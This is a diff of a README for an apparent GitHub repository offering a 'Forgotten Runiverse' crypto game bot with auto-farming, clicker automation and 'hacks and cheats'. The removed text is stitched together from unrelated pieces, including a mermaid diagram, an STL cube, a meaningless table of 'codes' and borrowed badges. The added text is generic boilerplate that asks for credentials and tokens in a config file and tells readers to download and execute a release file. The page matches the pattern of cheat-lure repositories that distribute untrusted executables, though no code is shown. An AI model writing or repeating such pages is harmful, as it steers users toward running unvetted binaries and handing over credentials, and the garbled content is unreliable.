@@ -1,188 +1,116 @@
-<div align="center">
-<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
-</div>
+# 🚀 Forgotten Runiverse Crypto Bot
 
-<h1 align="center">
-    <a href="https://amplication.com/#gh-light-mode-only">
-    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
-    </a>
-    <a href="https://amplication.com/#gh-dark-mode-only">
-    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
-    </a>
-</h1>
+![Forgotten Runiverse Bot](https://img.shields.io/badge/Forgotten%20Runiverse%20Bot-Ready-brightgreen)
 
-<p align="center">
-  <i align="center">Building System Applications with C# & C++ 🚀</i>
-</p>
-  
-<p align="center">
-  Hi, I'm Mathieu 👋 I'm a 🚀 French developer 🚀 I ❤️ Happy Hardcore ❤️
-</p>
+Welcome to the **Forgotten Runiverse Crypto Bot** repository! This bot automates farming and clicker activities in the Forgotten Runiverse game. It integrates cryptocurrency features and supports an API for enhanced functionality. With Telegram support, you can easily manage the bot and optimize your gameplay.
 
-## Read About
-Forgotten Runiverse is a free to play MMORPG, which will have blockchain integrations without requiring players to create a crypto wallet in order to play. The game features a player-owned and driven world and economy. In Forgotten Runiverse, players are able to create their own stories and experiences with extensive crafting, exploration, and crafting systems that form a vibrant, ever-evolving world for MMO players and blockchain enthusiasts alike. The Runiverse is here to create a life-long community and is developed by game industry veterans at Bisonic with experience at Blizzard, Ubisoft, Capcom, Digital Extremes, Nexon, TinyCo.
-Being a live service game, it will continue to receive patches throughout its life. Community feedback and lore will be help shape the direction of the game as it updates.
+## 📦 Table of Contents
 
-#### **Please Read First What You Need Part.**
-#### <p align="Left"><a href="#what-you-need-1">WHAT YOU NEED</a></p> 
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Telegram Support](#telegram-support)
+- [API Integration](#api-integration)
+- [Cheats and Hacks](#cheats-and-hacks)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
+- [Contact](#contact)
 
-https://github.com/user-attachments/assets/1d8b1607-5925-40d6-8d22-faecc814d0f5
+## ✨ Features
 
-![144](https://github.com/user-attachments/assets/4803504d-7701-4ee3-af05-d93be93ed75a)
+- **Automated Farming**: Effortlessly farm resources while you focus on other tasks.
+- **Clicker Automation**: Automatically perform clicker actions to maximize efficiency.
+- **Crypto Integration**: Seamlessly interact with cryptocurrency wallets and transactions.
+- **API Support**: Utilize the API for custom integrations and enhancements.
+- **Telegram Management**: Control the bot directly from Telegram for convenience.
+- **Hacks and Cheats**: Access tools designed to enhance gameplay and optimize profits.
 
+## 📥 Installation
 
+To get started, clone this repository to your local machine:
 
-
-```mermaid
-erDiagram
-    PLAYER_WALLET {
-        string id
-        string playerName
-        float inGameCurrency
-    }
-    PLAYER_WALLET ||--o{ GAME_TRANSACTION : initiates
-    PLAYER_WALLET ||--o{ GAME_BALANCE : updates
-    GAME_TRANSACTION ||--o{ GAME_CONFIRMATION : confirms
-    GAME_CONFIRMATION ||--o{ PLAYER_WALLET : updates
-    GAME_CONFIRMATION ||--o{ GAME_BLOCKCHAIN : records
-    GAME_BLOCKCHAIN }|--o{ GAME_TRANSACTION : contains
-    GAME_BLOCKCHAIN }|--o{ GAME_BALANCE : contains
+```bash
+git clone https://github.com/VegitoX3D/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.git
 ```
-### What You Need
-----
-                    
-| Tool              | Code         |
-| ----------------- | ------------ |
-| Blockchain Explorer | 0000       |
-| Cryptogame  | Daf     |
-| Farm      | 000          |
-| Auto Clicker  | ST8 |
-| Solana Explorer   | 91           |
 
-                
-----
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+Navigate to the project directory:
 
-<!-- ROADMAP -->
-## Roadmap
-
-- [x] New Gui
-- [ ] Add back to top links
-- [x] Add Additional Templates w/ Examples
-- [x] New Features
-- [ ] Multi-language Support
-    - [ ] Chinese
-    - [ ] Turkish
-    - [ ] French
-    - [ ] Spanish
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<!-- GETTING STARTED -->
-## Getting Started
-
-### Prerequisites
-
-This is an example of how to list things you need to use the software and how to install them.
-* npm
-  ```sh
-  npm install npm@latest -g
-  ```
-
-### Installation
-
-1. Download Visual Studio 2022
-_using Git Clone Or either download the project or exit the rar. Then Download Visual Studio 2022 Here Link [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
-![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
-> Download These
-
-2. Clone the repo
-   ```sh
-   git clone https://github.com/SoonAdd/Addsoon.git
-   ```
-3. OR
-
-![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)
-
-
-4. _Then open the sln (Project Solution) file_
-
-![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)
-
-5. Find Executable File
-   ```sh
-   /ProjectName/Bin/Debug/Executable.exe
-   ```
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-```stl
-solid cube_corner
-  facet normal 0.0 -1.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 1.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-  facet normal 0.0 0.0 -1.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 1.0 0.0 0.0
-    endloop
-  endfacet
-  facet normal -1.0 0.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-      vertex 0.0 1.0 0.0
-    endloop
-  endfacet
-  facet normal 0.577 0.577 0.577
-    outer loop
-      vertex 1.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-endsolid
+```bash
+cd Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api
 ```
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
 
-<!-- CONTRIBUTING -->
-## Contributing
-<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>
+Install the required dependencies:
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+```bash
+npm install
+```
 
-<p align="center">
-    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
-</p>
+## ⚙️ Usage
 
+To run the bot, execute the following command:
 
-Not sure where to start? Join our discord and we will help you get started!
+```bash
+node bot.js
+```
 
-<a href="https://discord.gg/U3UqGHxf"><img src="https://amplication.com/images/discord_banner_purple.svg" /></a>
+Make sure to configure your settings in the `config.json` file. This file allows you to set your game credentials, API keys, and Telegram bot token.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+## 📱 Telegram Support
 
-<p align="center">
-  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
-</p>
+Our bot supports Telegram for easy management. You can set up a Telegram bot and connect it to this bot for commands and updates. Follow these steps:
+
+1. Create a new bot on Telegram using the BotFather.
+2. Copy the bot token and paste it into the `config.json` file.
+3. Start interacting with your bot using commands like `/start`, `/status`, and `/stop`.
+
+## 🔗 API Integration
+
+The bot includes API support for developers looking to create custom features. The API allows you to:
+
+- Fetch game data.
+- Send transactions.
+- Retrieve user statistics.
+
+For more details, check the API documentation in the `docs` folder.
+
+## 💻 Cheats and Hacks
+
+This bot provides various tools to enhance your gameplay. You can find hacks for:
+
+- Resource generation.
+- Speed enhancements.
+- Clicker boosts.
+
+Use these tools responsibly to improve your experience in the game.
+
+## 🤝 Contributing
+
+We welcome contributions! If you want to add features or improve the bot, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes and commit them.
+4. Push to your branch.
+5. Open a pull request.
+
+Please ensure your code adheres to our coding standards and includes relevant documentation.
+
+## 📜 License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## 🚀 Releases
+
+To download the latest version of the bot, visit our [Releases](https://github.com/VegitoX3D/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases) section. Download the appropriate file and execute it to start using the bot.
+
+## 📞 Contact
+
+For questions or support, feel free to reach out:
+
+- **Email**: support@example.com
+- **Telegram**: @YourUsername
+
+---
+
+Thank you for checking out the **Forgotten Runiverse Crypto Bot**! We hope you enjoy automating your gameplay and maximizing your profits. If you find any issues or have suggestions, please let us know!
